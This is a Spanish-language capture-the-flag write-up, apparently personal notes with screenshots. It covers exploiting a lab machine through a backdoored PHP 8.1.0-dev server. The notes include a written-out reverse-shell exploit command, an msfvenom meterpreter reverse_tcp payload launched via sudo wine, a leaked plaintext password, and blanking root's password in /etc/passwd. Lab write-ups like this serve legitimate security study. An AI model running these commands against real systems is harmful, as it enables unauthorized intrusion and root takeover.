Hacemos el reconocimiento con nmap:
![[Pasted image 20231030074318.png]]
Y esto corre dentro del puerto 80:
![[Pasted image 20231030074348.png]]
Y lo mismo por el puerto 8080:
![[Pasted image 20231030074419.png]]
Y si miramos las cabeceras del puerto 8080 vemos algo de php:
![[Pasted image 20231030074808.png]]
Investigamos exploits para esta versión, donde podemos usar el siguiente exploit:
https://github.com/flast101/php-8.1.0-dev-backdoor-rce
![[Pasted image 20231030074902.png]]
Vemos las instrucciones y lo lanzamos:
```bash
python revshell_php_8.1.0-dev.py http://192.168.0.43:8080/ 192.168.0.32 443
```
![[Pasted image 20231030075045.png]]
Donde recibiremos la reverse shell:
![[Pasted image 20231030075059.png]]
Pero vemos que no estamos dentro de la máquina víctima, sino a un contenedor o algo similar:
![[Pasted image 20231030075146.png]]
Y si miramos en el history, vemos una contraseña para entrar como el usuario liam:
```bash
liam:L14mD0ck3Rp0w4
```
![[Pasted image 20231030075553.png]]
Y vemos que funciona y ya somos el usuario liam:
![[Pasted image 20231030075655.png]]
Si ejecutamos un sudo -l vemos que podemos ejecutar como sudo la herramienta de wine:
![[Pasted image 20231030075809.png]]
Pero si lo ejecutamos, vemos que pide un fichero .exe para ejecutarlo:
![[Pasted image 20231030080321.png]]
Por lo que podemos crear con msfvenom un fichero malicioso en formato exe:
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.32 LPORT=443 -f exe > pwned.exe
```
Y lo compartimos con la máquina víctima:
![[Pasted image 20231030080617.png]]
Y ponemos el payload para recibir una sesión de meterpreter:
```bash
set PAYLOAD windows/x64/meterpreter/reverse_tcp
```
![[Pasted image 20231030080705.png]]
Lo ejecutamos como sudo en la máquina víctima:
![[Pasted image 20231030080757.png]]
Y recibimos la conexión con mi máquina atacante como root:
![[Pasted image 20231030080831.png]]
Pero esta sesión tiene limitaciones, por lo que si queremos convertirnos en usuario root de forma normal, podemos copiarnos en local el fichero /etc/passwd y eliminar la parte de la x de root, de tal forma que así podremos iniciar sesión como root sin proporcionar su contraseña:
![[Pasted image 20231030081501.png]]
Y quitamos la x de root, lo cual significa que es el campo de contraseña:
![[Pasted image 20231030081618.png]]
Lo volvemos a subir a la máquina víctima reemplazando el passwd original, ubicándonos en el directorio /etc y ahí lo subimos:
![[Pasted image 20231030081755.png]]
Por lo que si ahora iniciamos sesión como liam y ejecutamos el comando su root, no nos pedirá las credenciales gracias a haber reemplzado el fichero passwd:
![[Pasted image 20231030081912.png]]
